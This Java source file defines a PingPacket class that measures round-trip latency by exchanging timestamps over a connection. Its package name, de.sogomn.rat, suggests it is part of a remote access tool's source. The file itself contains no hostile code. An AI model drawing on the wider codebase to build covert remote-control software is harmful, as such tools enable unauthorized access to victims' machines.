/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;

public final class PingPacket extends AbstractPingPongPacket {
	
	private long milliseconds;
	
	public PingPacket() {
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		final long time = System.currentTimeMillis();
		
		connection.writeLong(time);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeLong(milliseconds);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		milliseconds = connection.readLong();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		milliseconds = System.currentTimeMillis() - connection.readLong();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public long getMilliseconds() {
		return milliseconds;
	}
	
}
